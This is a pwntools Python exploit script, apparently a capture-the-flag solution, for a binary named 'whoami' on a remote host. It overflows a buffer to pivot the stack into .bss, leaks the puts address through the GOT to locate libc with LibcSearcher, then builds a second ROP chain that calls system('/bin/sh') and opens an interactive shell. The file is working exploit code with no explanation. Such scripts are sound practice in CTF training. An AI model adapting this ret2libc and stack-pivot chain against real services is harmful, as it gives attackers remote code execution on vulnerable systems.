from pwn import *
from LibcSearcher import *
p=remote('61.147.171.105',51339)
# p=process('./whoami')
elf=ELF('./whoami')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
rl = lambda	a=False		: p.recvline(a)
ru = lambda a=True	: p.recvuntil(a)
rn = lambda x			: p.recvn(x)
sn = lambda x			: p.send(x)
sl = lambda x			: p.sendline(x)
sa = lambda a,b			: p.sendafter(a,b)
sla = lambda a,b		: p.sendlineafter(a,b)
irt = lambda			: p.interactive()
dbg = lambda text=None  : gdb.attach(p, text)
lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))

#rdi, rsi, rdx, rcx,
bss_addr=0x601040
buf_addr1=bss_addr+0xc0
buf_addr2=bss_addr+0x70
buf_addr3=bss_addr+0x308
main_addr=0x0000000000400771
pop_rbp=0x0000000000400648
pop_rdi=0x0000000000400843
pop_rsi_r15=0x0000000000400841
puts_plt=elf.plt['puts']
read_plt=elf.plt['read']
puts_got=elf.got['puts']
read_got=elf.got['read']
read_0xf0=0x00000000004007BB
leave_ret=0x00000000004007d6
power_rop1=0x000000000040083A
power_rop2=0x0000000000400820
ru(b'Input name:\n')

payload1=b'a'*0x20+p64(buf_addr1)+p64(leave_ret)##bss+0xc0
sn(payload1)

ru(b'Else?\n')
payload2=b'b'*0xc0+p64(buf_addr2)
payload2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_0xf0)
sn(payload2)

puts_addr=u64(p.recv().strip().ljust(8,b'\x00'))
print("puts:",hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump('puts')
# libcbase=puts_addr-libc.symbols['puts']
print('libcbase',hex(libcbase))
system_addr=libcbase+libc.dump('system')
# system_addr=libcbase+libc.symbols['system']
print("system:",hex(system_addr))
pause()

payload3=b'w'*0x70+p64(buf_addr3)
payload3+=p64(pop_rdi)+p64(0)
payload3+=p64(pop_rsi_r15)+p64(buf_addr3)+p64(0)+p64(read_plt)+p64(leave_ret)
# payload3=payload3.ljust(240,b's')
sn(payload3)

payload4 = p64(bss_addr+0x400)
payload4 += p64(pop_rdi)
payload4 += p64(bss_addr+0x308+0x20)
payload4 += p64(system_addr)
payload4 += b'/bin/sh\x00'
sl(payload4)

pause()
p.interactive()
